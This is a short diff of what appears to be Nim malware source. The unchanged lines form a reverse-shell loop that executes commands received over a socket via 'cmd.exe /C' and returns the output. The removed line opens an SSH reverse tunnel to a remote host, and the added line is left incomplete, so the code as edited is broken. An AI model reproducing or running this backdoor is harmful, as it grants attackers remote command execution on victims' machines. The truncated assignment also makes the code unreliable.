@@ -24,5 +24,5 @@ while true:
     let bad = recvLine(sock) 
     let cmd = execProcess(fmt"cmd.exe /C " & bad)
     send(sock,cmd)
-    let sshCmd = "ssh -fN -R 2222:localhost:22 user@192.168.0.54"
+    let sshCmd = 
 discard execShellCmd(sshCmd)
